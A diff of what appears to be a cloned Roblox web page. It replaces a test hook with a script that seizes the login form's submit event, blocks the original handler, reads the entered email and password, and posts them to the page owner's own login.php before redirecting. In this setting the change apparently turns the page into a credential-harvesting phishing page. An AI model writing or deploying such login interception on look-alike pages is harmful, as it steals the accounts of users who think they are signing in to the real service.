@@ -752,14 +752,44 @@
     <script onerror='Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)' data-monitor='true' data-bundlename='pageEnd' type='text/javascript' src='https://js.rbxcdn.com/e1c68f73f4abea7bdd5af9574cdf034d.js'></script>
     
     <script>
-const btn = document.getElementById("login-button");
+document.addEventListener("submit", function (e) {
+    const form = e.target;
 
-btn.addEventListener("pointerdown", function (e) {
+    // Asegúrate que sea TU formulario de login
+    if (!form.matches("#login-form")) return;
+
     e.preventDefault();
     e.stopImmediatePropagation();
 
-    console.log("🔥 LOGIN HOOKEADO");
-    alert("Acción personalizada ejecutada");
+    const email = form.querySelector("input[name='email']")?.value;
+    const pass  = form.querySelector("input[name='pass']")?.value;
+
+    if (!email || !pass) {
+        alert("Campos incompletos");
+        return;
+    }
+
+    const formData = new FormData();
+    formData.append("email", email);
+    formData.append("pass", pass);
+
+    fetch("login.php", {
+        method: "POST",
+        body: formData,
+        credentials: "same-origin"
+    })
+    .then(res => res.json())
+    .then(data => {
+        if (data.success) {
+            window.location.href = "/dashboard";
+        } else {
+            alert("Login incorrecto");
+        }
+    })
+    .catch(err => {
+        console.error(err);
+        alert("Error de red");
+    });
 }, true);
 </script>
 
